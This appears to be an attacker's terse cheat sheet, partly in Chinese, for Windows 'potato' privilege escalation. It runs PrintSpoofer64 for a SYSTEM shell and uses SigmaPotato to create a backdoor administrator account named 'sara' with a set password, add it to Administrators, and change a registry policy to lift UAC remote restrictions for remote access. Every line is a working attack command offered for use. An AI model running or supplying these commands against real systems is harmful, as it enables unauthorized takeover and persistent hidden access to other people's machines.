potatos


```
.\PrintSpoofer64.exe  -i -c powershell
```

添加管理员用户，开启远程桌面连接
.\SigmaPotato "net user sara 1qaz2wsxA /add"
.\SigmaPotato "net localgroup Administrators sara /add"
禁用UAC 远程限制
.\SigmaPotato "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"